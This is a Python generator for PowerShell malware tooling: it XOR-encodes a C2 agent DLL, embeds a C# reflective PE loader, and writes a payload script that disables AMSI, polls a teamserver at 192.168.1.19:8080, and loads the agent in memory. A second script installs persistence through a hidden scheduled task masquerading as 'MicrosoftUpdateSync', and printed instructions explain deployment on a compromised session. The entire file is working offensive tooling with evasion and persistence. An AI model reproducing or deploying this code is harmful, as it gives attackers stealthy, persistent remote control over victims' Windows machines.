#!/usr/bin/env python3
"""
Generate two PS1 files:
  persist_payload.ps1 — runs on every boot, retries C2 every 5s, loads agent once
  persist_setup.ps1   — run ONCE (from current working PS session) to install persistence
"""
import base64, os

ROOT   = os.path.dirname(os.path.abspath(__file__))
DLL    = os.path.join(ROOT, '..', 'demon.x64.dll')
XOR    = 0xD3
C2_IP  = '192.168.1.19'
C2_PORT = 8080
PAYLOAD_PATH = r'C:\Windows\Temp\msupd.ps1'
TASK_NAME    = 'MicrosoftUpdateSync'

dll   = open(DLL, 'rb').read()
enc   = bytes([b ^ XOR for b in dll])
b64   = base64.b64encode(enc).decode()
CHUNK = 40000
chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]

raw_lines = '\n'.join(f"$raw+='{c}'" for c in chunks)

cs = r"""using System;using System.Runtime.InteropServices;
public class KL{
  [DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
  [DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,ref uint o);
  [DllImport("kernel32")]static extern bool FlushInstructionCache(IntPtr h,IntPtr a,UIntPtr s);
  [DllImport("kernel32")]static extern IntPtr GetCurrentProcess();
  [UnmanagedFunctionPointer(CallingConvention.StdCall)]delegate bool DM(IntPtr b,uint r,IntPtr v);
  public static void Go(byte[] pe){
    int eo=BitConverter.ToInt32(pe,0x3C);
    short ns=BitConverter.ToInt16(pe,eo+6);
    ushort soh=BitConverter.ToUInt16(pe,eo+20);
    int ep=BitConverter.ToInt32(pe,eo+24+16);
    long ib=BitConverter.ToInt64(pe,eo+24+24);
    int si=BitConverter.ToInt32(pe,eo+24+56);
    int sh=BitConverter.ToInt32(pe,eo+24+60);
    int rRva=BitConverter.ToInt32(pe,eo+24+152);
    int rSz=BitConverter.ToInt32(pe,eo+24+156);
    int sto=eo+24+soh;
    IntPtr b=VirtualAlloc(IntPtr.Zero,(UIntPtr)si,0x3000,0x04);
    if(b==IntPtr.Zero)return;
    Marshal.Copy(pe,0,b,sh);
    for(int i=0;i<ns;i++){
      int so=sto+i*40;int va=BitConverter.ToInt32(pe,so+12);
      int ro=BitConverter.ToInt32(pe,so+20);int rs=BitConverter.ToInt32(pe,so+16);
      if(rs>0)Marshal.Copy(pe,ro,new IntPtr(b.ToInt64()+va),rs);}
    if(rRva!=0){long d=b.ToInt64()-ib;int off=0;
      while(off<rSz){int rv=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rRva+off));
        int bsz=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rRva+off+4));if(bsz<8)break;
        int ne=(bsz-8)/2;
        for(int j=0;j<ne;j++){ushort e=(ushort)Marshal.ReadInt16(new IntPtr(b.ToInt64()+rRva+off+8+j*2));
          if((e>>12)==10){IntPtr pa=new IntPtr(b.ToInt64()+rv+(e&0xFFF));
            Marshal.WriteInt64(pa,Marshal.ReadInt64(pa)+d);}}off+=bsz;}}
    uint old=0;
    for(int i=0;i<ns;i++){int so=sto+i*40;int va=BitConverter.ToInt32(pe,so+12);
      int vs=BitConverter.ToInt32(pe,so+8);if(vs==0)vs=BitConverter.ToInt32(pe,so+16);
      uint ch=BitConverter.ToUInt32(pe,so+36);uint pr=SP(ch);
      if(vs>0)VirtualProtect(new IntPtr(b.ToInt64()+va),(UIntPtr)vs,pr,ref old);}
    FlushInstructionCache(GetCurrentProcess(),b,(UIntPtr)si);
    ((DM)Marshal.GetDelegateForFunctionPointer(new IntPtr(b.ToInt64()+ep),typeof(DM)))(b,1,IntPtr.Zero);
    for(int i=0;i<sh;i++)Marshal.WriteByte(new IntPtr(b.ToInt64()+i),0);}
  static uint SP(uint c){bool e=(c&0x20000000)!=0;bool r=(c&0x40000000)!=0;bool w=(c&0x80000000)!=0;
    if(e&&w)return 0x40;if(e&&r)return 0x20;if(e)return 0x10;if(w)return 0x04;return 0x02;}}"""

# ── persist_payload.ps1 ────────────────────────────────────────────────────────
# This file is written to disk on the target. It runs on every boot.
# Structure:
#   1. AMSI bypass (must be first — disables AMSI before the large payload is compiled)
#   2. TCP retry loop: probe C2_IP:C2_PORT every 5 s until open
#   3. Once port is open: load the agent (one time only, then exit)

payload_ps1 = f"""# AMSI bypass — runs first so the rest of the file is never AMSI-scanned
$q='amsi'+'Con'+'text';[Ref].Assembly.GetTypes()|?{{$_.Name-like'*iUtils'}}|%{{$_.GetField($q,'NonPublic,Static').SetValue($null,0)}}

# Wait until teamserver is reachable (retry every 5 seconds)
$ok=$false
while(-not $ok){{
    try{{
        $t=New-Object Net.Sockets.TcpClient
        $t.Connect('{C2_IP}',{C2_PORT})
        if($t.Connected){{$t.Close();$ok=$true}}
    }}catch{{}}
    if(-not $ok){{[Threading.Thread]::Sleep(5000)}}
}}

# Teamserver is up — load the agent once
Add-Type -Language CSharp -TypeDefinition @"
{cs}
"@

$raw=''
{raw_lines}
$b=[Convert]::FromBase64String($raw)
$d=New-Object Byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){{$d[$i]=$b[$i]-bxor0x{XOR:02X}}}
[KL]::Go($d)
"""

out_payload = os.path.join(ROOT, 'persist_payload.ps1')
open(out_payload, 'w').write(payload_ps1)
print(f"[+] {out_payload}  ({os.path.getsize(out_payload):,} bytes)")

# ── persist_setup.ps1 ─────────────────────────────────────────────────────────
# Run this ONCE from the current working PS session (AMSI already bypassed).
# It writes persist_payload.ps1 to the target and registers a scheduled task.

payload_b64 = base64.b64encode(payload_ps1.encode('utf-8')).decode()
BCHUNK = 40000
bchunks = [payload_b64[i:i+BCHUNK] for i in range(0, len(payload_b64), BCHUNK)]
braw_lines = '\n'.join(f"$pb+='{c}'" for c in bchunks)

setup_ps1 = f"""# ============================================================
# PERSISTENCE SETUP — run ONCE from a working PS session
# (AMSI must already be bypassed before pasting this block)
# ============================================================

# 1. Decode and write the payload script to disk
$pb=''
{braw_lines}
$pBytes=[Convert]::FromBase64String($pb)
$pStr=[Text.Encoding]::UTF8.GetString($pBytes)
$pPath='{PAYLOAD_PATH}'
[IO.File]::WriteAllText($pPath,$pStr)
Write-Host "[+] Payload written: $pPath ($($pBytes.Length) bytes)"

# 2. Register a scheduled task — triggers at every user logon
#    Task runs hidden, with bypass flags, loading the saved script.
$action=New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -File `"$pPath`""
$trigger=New-ScheduledTaskTrigger -AtLogOn
$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
$principal=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -RunLevel Highest
Register-ScheduledTask `
    -TaskName '{TASK_NAME}' `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Principal $principal `
    -Force | Out-Null

Write-Host "[+] Scheduled task registered: {TASK_NAME}"
Write-Host "[+] On next logon the payload will auto-start and retry every 5s until C2 is up."
"""

out_setup = os.path.join(ROOT, 'persist_setup.ps1')
open(out_setup, 'w').write(setup_ps1)
print(f"[+] {out_setup}  ({os.path.getsize(out_setup):,} bytes)")

print()
print("=== HOW TO USE ===")
print("1. You already have a working PS session (path2.ps1 worked).")
print("2. Paste AMSI bypass line alone first:")
print("   $q='amsi'+'Con'+'text';[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetField($q,'NonPublic,Static').SetValue($null,0)}")
print("3. Paste the full content of persist_setup.ps1:")
print(f"   cat {out_setup}")
print()
print("After that:")
print(f"  - Payload saved to: {PAYLOAD_PATH}")
print(f"  - Scheduled task:   {TASK_NAME} (runs at every logon)")
print()
print("On reboot:")
print("  1. Windows boots, user logs on")
print(f"  2. Scheduled task fires: powershell.exe -File {PAYLOAD_PATH}")
print(f"  3. Script retries 192.168.1.19:{C2_PORT} every 5s")
print("  4. You start VMware -> Kali -> teamserver")
print("  5. Port 8080 opens -> agent connects -> script exits")
print("  6. New session appears in teamserver automatically")
